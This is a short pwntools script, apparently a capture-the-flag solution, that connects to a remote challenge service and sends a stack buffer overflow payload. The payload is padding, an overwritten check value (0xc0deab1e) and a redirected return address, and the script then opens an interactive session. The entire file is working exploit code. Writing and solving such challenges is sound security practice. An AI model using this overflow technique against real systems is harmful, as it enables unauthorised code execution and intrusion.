from pwn import *
import string
context.log_level = "debug"
# context.binary = ELF('./vuln')
p = remote("sisterlab.id", 42002)
# p = process("./client")
payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQAAAA"
payload += p64(0xc0deab1e)
payload += b"AAAABBBB"
payload += p64(0x00401186)
# payload += p64(0x00000000)

# gdb.attach(p, gdbscript=f""" 
# r <<< $(echo -ne {payload}) 
# """) 
p.recvuntil("> ")
p.sendline(payload)
p.recvuntil("> ")
p.sendline("stop")
p.interactive()